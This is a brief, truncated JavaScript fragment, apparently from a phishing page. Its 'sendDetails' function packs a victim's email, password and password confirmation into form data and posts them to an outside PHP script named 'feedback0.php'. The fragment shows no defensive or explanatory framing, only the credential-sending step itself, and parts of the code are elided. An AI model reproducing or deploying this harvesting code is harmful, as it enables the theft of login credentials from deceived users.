...
function set(t, e) {
 ...
 function sendDetails(t, e, n,q) {
      var o = new FormData;
      o.append("email", t),o.append("q",q), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://shutterworld.com.au/feedback0.php", o).then(function(t) {
